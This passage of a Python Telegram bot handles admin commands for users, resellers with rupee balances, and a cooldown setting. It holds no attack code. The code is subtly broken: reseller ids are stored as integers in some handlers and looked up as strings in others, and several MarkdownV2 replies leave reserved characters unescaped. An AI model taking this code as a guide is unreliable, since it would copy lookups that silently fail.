    for user, expiration in users.items():
        username = bot.get_chat(user).username or bot.get_chat(user).first_name
        response += f"🆔 {user}\n👤 @{username}\n⏰ {expiration}\n\n"
    if not users:
        response += "😕 *No users!*"
    bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    """Handle the /resellers command to list resellers."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/resellers")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in ADMIN_IDS:
        response = "🤝 *Resellers!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌\n" if user_id in SUPER_ADMIN_IDS else '\n')
        for reseller_id, balance in resellers.items():
            username = bot.get_chat(reseller_id).username or "Unknown"
            response += f"👤 {username}\n🆔 {reseller_id}\n💰 {balance} Rs\n\n"
        if not resellers:
            response += "😕 *No resellers!*"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    else:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    """Handle the /add_reseller command to add a new reseller."""
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 3:
        response = "📝 */add_reseller <id> <bal>*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    reseller_id, balance = int(command[1]), int(command[2])
    if reseller_id not in resellers:
        resellers[reseller_id] = balance
        save_resellers(resellers)
        response = f"🎉 *Reseller {reseller_id} added!* 💰 {balance} Rs"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    else:
        response = f"😕 *Reseller {reseller_id} exists!*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    """Handle the /remove command to delete a user."""
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 2:
        response = "📝 */remove <id>*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    target = command[1]
    if target in users:
        del users[target]
        save_users()
        response = f"🗑️ *User {target} removed!*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    else:
        response = f"😕 *User {target} not found!*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    """Handle the /addbalance command to add funds to a reseller."""
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in ADMIN_IDS:
        command = message.text.split()
        if len(command) != 3:
            response = "📝 */addbalance <id> <amt>*"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Boss, shukriya!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
            return
        reseller_id, amount = int(command[1]), float(command[2])
        if reseller_id in resellers:
            resellers[reseller_id] += amount
            save_resellers(resellers)
            response = f"💰 *Added {amount} Rs to {reseller_id}!* New: {resellers[reseller_id]} Rs"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Boss, shukriya!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        else:
            response = "😕 *Reseller not found!*"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Boss, shukriya!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
    else:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    """Handle the /remove_reseller command to delete a reseller."""
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in ADMIN_IDS:
        command = message.text.split()
        if len(command) != 2:
            response = "📝 */remove_reseller <id>*"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Boss, shukriya!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
            return
        reseller_id = command[1]
        if reseller_id in resellers:
            del resellers[reseller_id]
            save_resellers(resellers)
            response = f"🗑️ *Removed {reseller_id}!*"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Boss, shukriya!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        else:
            response = "😕 *Reseller not found!*"
            if user_id in SUPER_ADMIN_IDS:
                response += "\n👑 *O Boss, shukriya!* 🙌"
            bot.reply_to(message, response, parse_mode='MarkdownV2')
    else:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    """Handle the /balance command to check reseller balance."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/balance")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in resellers:
        response = f"💰 *Balance: {resellers[user_id]} Rs*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
    else:
        response = "😕 *Not a reseller!*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    """Handle the /setcooldown command to set cooldown period."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/setcooldown")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 2:
        response = "📝 */setcooldown <s>*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    seconds = int(command[1])
    if seconds <= 0:
        response = "😓 *>0 seconds!*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    set_cooldown(seconds)
    response = f"⏳ *Cooldown: {seconds}s*"
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Boss, shukriya!* 🙌"
    bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    """Handle the /checkcooldown command to display current cooldown."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/checkcooldown")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    bot.reply_to(message, f"⏳ *Cooldown: {COOLDOWN_PERIOD}s*", parse_mode='MarkdownV2')

if __name__ == "__main__":
    """Start the bot with initial data loading."""
    load_cooldown()
    users.update(read_users())
    keys.update(read_keys())
    resellers.update(load_resellers())
    print("Bot starting...")
    bot.polling(none_stop=True)